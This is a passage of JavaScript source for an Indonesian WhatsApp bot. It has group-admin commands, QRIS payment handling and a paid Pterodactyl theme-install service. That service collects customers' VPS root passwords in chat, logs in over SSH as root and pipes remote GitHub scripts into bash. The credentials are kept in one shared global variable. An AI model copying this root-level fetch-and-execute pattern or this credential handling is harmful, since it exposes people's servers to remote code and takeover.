return m.reply(teks)
}
break

case "domain": {
    if (!isCreator) return reply(mess.owner)

    // Pastikan `args` diinisialisasi dengan benar
    const args = text.split(" "); // Misalnya, argumen diambil dari perintah

    if (!args || args.length < 2) {
        return m.reply("Format perintah salah! Contoh: domain <angka> <hostname|IP>");
    }

    const dom = Object.keys(global.subdomain);
    const index = parseInt(args[0]) - 1; // Mengubah argumen pertama menjadi angka
    if (isNaN(index) || index < 0 || index >= dom.length) {
        return m.reply("Domain tidak ditemukan!");
    }

    let tldnya = dom[index];
    const hostIp = args[1].split("|");
    if (hostIp.length !== 2) {
        return m.reply("Format hostname/IP tidak valid! Gunakan format: hostname|IP");
    }

    const [host, ip] = hostIp;

    if (!host || !ip) {
        return m.reply("Hostname atau IP tidak valid!");
    }

    async function subDomain1(host, ip) {
        return new Promise((resolve) => {
            axios
                .post(
                    `https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
                    {
                        type: "A",
                        name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya,
                        content: ip.replace(/[^0-9.]/gi, ""),
                        ttl: 3600,
                        priority: 10,
                        proxied: false,
                    },
                    {
                        headers: {
                            Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
                            "Content-Type": "application/json",
                        },
                    }
                )
                .then((e) => {
                    let res = e.data;
                    if (res.success) {
                        resolve({
                            success: true,
                            zone: res.result?.zone_name,
                            name: res.result?.name,
                            ip: res.result?.content,
                        });
                    } else {
                        resolve({ success: false, error: res.errors?.[0]?.message || "Unknown error" });
                    }
                })
                .catch((err) => {
                    let errorResponse =
                        err.response?.data?.errors?.[0]?.message || err.response?.data || err.message || "Unknown error";
                    resolve({ success: false, error: String(errorResponse) });
                });
        });
    }

    await subDomain1(host.toLowerCase(), ip).then(async (e) => {
        if (e.success) {
            let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server:* ${e.ip}\n*Subdomain:* ${e.name}
`;
            await m.reply(teks);
        } else {
            return m.reply(`Gagal membuat subdomain: ${e.error}`);
        }
    });
}
break;

case "autotyping": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

case "autoreadsw": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

case "autoread": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

case "joinch": case "joinchannel": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await dwiaff.newsletterMetadata("invite", result)
await dwiaff.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

case "joingc": case "join": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await dwiaff.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

case "autopromosi": {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

case "on": case "off": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*#- List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

case "add": case "addmember": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await dwiaff.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await dwiaff.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return m.reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await dwiaff.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await dwiaff.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

case "kick": case "kik": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return m.reply(mess.admin)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await dwiaff.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await dwiaff.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

case "kicktime": case "kiktime": {
    if (!m.isGroup) return reply(mess.group);
    if (!isCreator && !m.isAdmin) return m.reply(mess.admin);
    if (!m.isBotAdmin) return m.reply(mess.botAdmin);

    if (text || m.quoted) {
        const args = text.split("|"); // Splitting input into @tag and time
        const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0] ? args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;
        const timeString = args[1] ? args[1].trim() : "10"; // Default time 10 seconds if no time is given

        // Check if timeString is a valid number
        let timeInSeconds = parseInt(timeString);
        if (isNaN(timeInSeconds)) return m.reply("Waktu yang diberikan tidak valid. Harap masukkan waktu dalam detik.");

        var onWa = await dwiaff.onWhatsApp(input.split("@")[0]);
        if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di WhatsApp");

        // Inform the group about the kick time
        await m.reply(`User ${input.split("@")[0]} akan dikeluarkan dalam ${timeInSeconds} detik...`);

        // Start the countdown
        let countdownMessage = await dwiaff.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` });

        // Countdown loop
        let interval = setInterval(async () => {
            timeInSeconds--;
            if (timeInSeconds <= 0) {
                clearInterval(interval); // Stop the countdown

                // Kick the user out of the group
                const res = await dwiaff.groupParticipantsUpdate(m.chat, [input], 'remove');
                await dwiaff.sendMessage(m.chat, { text: `Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini` });

                // Delete countdown message
                await dwiaff.deleteMessage(m.chat, countdownMessage.key);
            } else {
                // Update countdown message
                await dwiaff.sendMessage(m.chat, { text: `Kicking user in: ${timeInSeconds} detik...` }, { quoted: countdownMessage });
            }
        }, 1000); // Every 1 second

    } else {
        return m.reply(example("@tag|waktu"));
    }
}
break;

case "demote":
case "promote": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return m.reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return m.reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await dwiaff.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await dwiaff.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

/*==============================================*/
             case "addseller": {
if (!isCreator) return reply(mess.owner)  
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (reseller.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Reseller Panel!`)
await reseller.push(orang)
await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Reseller Panel`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break

case "addprem": {
    if (!isCreator) return reply(mess.owner)
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
            ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
            : m.quoted 
            ? m.quoted.sender 
            : '';
        if (premium.includes(orang)) 
            return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Sebagai Premium!`);
        await premium.push(orang);
        await fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
        m.reply(`Berhasil Menambahkan ${orang.split('@')[0]} Sebagai Pengguna Premium`);
    } else {
        return m.reply(example("@tag/62838XXX"));
    }
}
break;

case "addown": case "addowner": {
if (!isCreator) return reply(mess.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owners.includes(orang)) return m.reply(`User ${orang.split('@')[0]} Sudah Terdaftar Di Database Owner Bot!`)
await owners.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners))
m.reply(`Berhasil Menjadikan ${orang.split('@')[0]} Sebagai Owner Bot`)
} else {
return m.reply(example("@tag/62838XXX"))
}}
break

case "deposit": {
    if (!q) return reply(`*Example: ${prefix + command} 3000*`);

    let amount = parseInt(q.replace(/[^0-9]/g, "")); // Hanya angka untuk jumlah deposit
    if (isNaN(amount) || amount < 1000) {
        return reply(`*Jumlah minimal deposit adalah Rp1000.*\n\n_Example: ${prefix + command} 3000_`);
    }

    const UrlQr = global.qrisOrderKuota;

    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);

    const teksPembayaran = `
ғᴏʀᴍᴀᴛ ᴘᴇᴍʙᴀʏᴀʀᴀɴ sɪʟᴀʜᴋᴀɴ ᴛʀᴀɴsғᴇʀ ǫʀɪs ɪɴɪ sᴇʙᴇʟᴜᴍ ᴡᴀᴋᴛᴜ ʜᴀʙɪs
ᴘᴇᴍʙᴇʟɪᴀɴ: ᴅᴇᴘᴏsɪᴛ
ᴡᴀᴋᴛᴜ:𝟻 ᴍᴇɴɪᴛ
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].deposit = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].deposit.msg });
                    await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { delete: db.users[m.sender].deposit.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].deposit;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].deposit.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].deposit.amount) {
            db.users[m.sender].status_deposit = false;

            // Tambahkan saldo ke akun pengguna
            if (!db.users[m.sender].saldo) db.users[m.sender].saldo = 0;
            db.users[m.sender].saldo += parseInt(req);

            await dwiaff.sendMessage(db.users[m.sender].deposit.chat, { text: "Pembayaran berhasil! Saldo telah ditambahkan ke akun Anda." }, { quoted: db.users[m.sender].deposit.msg });
            await m.reply(`Saldo sebesar Rp${await toIDR(req)} telah ditambahkan ke akun Anda ✅`);
            delete db.users[m.sender].deposit;
        }
    }
}
break;

case "jasainstalltema": {
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
        let audioFile = './menu.mp3'; // Ganti 
        const msgii = await generateWAMessageFromContent(m.chat, {
          viewOnceMessageV2Extension: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              }, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.fromObject({
                  text: "ᴋᴀʟᴀᴜ ᴍᴀᴜ ɪɴsᴛᴀʟʟ ᴛʜᴇᴍᴇ ɴᴇʙᴜʟᴀ ɪɴsᴛᴀʟʟ ᴅᴇᴘᴇɴᴅ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ"
                }),
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                  cards: [{
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `ᴘɪʟɪʜ ᴛʜᴇᴍᴇ ʏᴀɴɢ ᴍᴀᴜ ᴅɪ ɪɴsᴛᴀʟʟ`,
                      hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: { url: 'https://img98.pixhost.to/images/376/544523985_media.jpg' }}, { upload: dwiaff.waUploadToServer }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [
                        {
                          "name": "single_select",
                          "buttonParamsJson": `{ 
                            "title": "ᴘɪʟɪʜ ᴛʜᴇᴍᴇ ɪᴄɪʙᴏs!!", 
                            "sections": [{ 
                              "title": "# ꜱɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ", 
                              "highlight_label": "ᴇʀʀᴏʀ", 
                              "rows": [
                                { "header": "ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇsᴛᴇʟʟᴀʀ", "title": "くそ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇsᴛᴇʟʟᴀʀ", "id": ".jasainstalltemastellar" },
                                { "header": "ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇᴇɴɪɢᴍᴀ", "title": "くそ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇᴇɴɢɪᴍᴀ", "id": ".jasainstalltemaenigma" },
                                { "header": "ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇʙɪʟʟɪɴɢ", "title": "くそ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇʙɪʟʟɪɢ", "id": ".jasainstalltemabilling" },
                                { "header": "ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇᴇʟʏsɪᴜᴍ", "title": "くそ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇᴇʟʏsɪᴜᴍ", "id": ".jasainstalltemaelysium" },
                                { "header": "ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇɴɪɢʜᴛᴄᴏʀᴇ", "title": "くそ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇɴɪɢʜᴛᴄᴏʀᴇ", "id": ".jasainstalltemanightcore" },
                                { "header": "ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇɴᴇʙᴜʟᴀ", "title": "くそ ɪɴsᴛᴀʟʟᴛʜᴇᴍᴇɴᴇʙᴜʟᴀ", "id": ".jasainstalltemanebula" },
                                { "header": "ɪɴsᴛᴀʟʟᴅᴇᴘᴇɴᴅ", "title": "くそ ɪɴsᴛᴀʟʟᴅᴇᴘᴇɴᴅ", "id": ".jasainstalldepend" }
                              ]
                            }]
                          }`
                        }
                      ]
                    })
                  }
                  ]
                })
              })
            }
          }
        }, { userJid: m.sender, quoted: qlive })
        await dwiaff.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id })
        await dwiaff.sendMessage(m.chat, {
          audio: { url: audioFile },
          mimetype: 'audio/mpeg'
        }, { quoted: qlive })
      }
        break
        
case "jasainstalltemanebula": {
    if (m.isGroup) return m.reply(mess.private);
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 1000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Nebula Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
            const ress = new Client();

            ress.on('ready', async () => {
                m.reply("Memproses install *tema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {    
                        await m.reply("Berhasil install *tema Nebula* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('2\n'); // Input sesuai kebutuhan instalasi tema Nebula
                        stream.write('\n');
                        stream.write('\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                m.reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalldepend": {
    if (m.isGroup) return m.reply(mess.private);;
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 1000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Depend Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                m.reply("Memproses instalasi tema enigma pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {
                        await m.reply("Berhasil install depend. Silakan lanjutkan dengan mengetik *.installnebula* ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('11\n');
                        stream.write('A\n');
                        stream.write('Y\n');
                        stream.write('Y\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                m.reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemanightcore;": {
    if (m.isGroup) return m.reply(mess.private);;
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Nightcore Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

Ketik *.batalbeli* untuk membatalkan transaksi.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran }, { quoted: m });
    db.users[m.sender].status_deposit = true;
    db.users[m.sender].saweria = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "QRIS pembayaran telah expired!" }, { quoted: db.users[m.sender].saweria.msg });
                    await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].saweria;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`;
            const ress = new Client();

            ress.on('ready', () => {
                m.reply("Memproses install *tema nightcore* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => {    
                        await m.reply("Berhasil install *tema nightcore* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('1\n'); // Pilihan instalasi
                        stream.write('y\n'); // Konfirmasi instalasi
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('Connection Error: ' + err);
                m.reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await dwiaff.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;

case "jasainstalltemaenigma": {
    if (m.isGroup) return m.reply(mess.private);;
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Enigma Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.

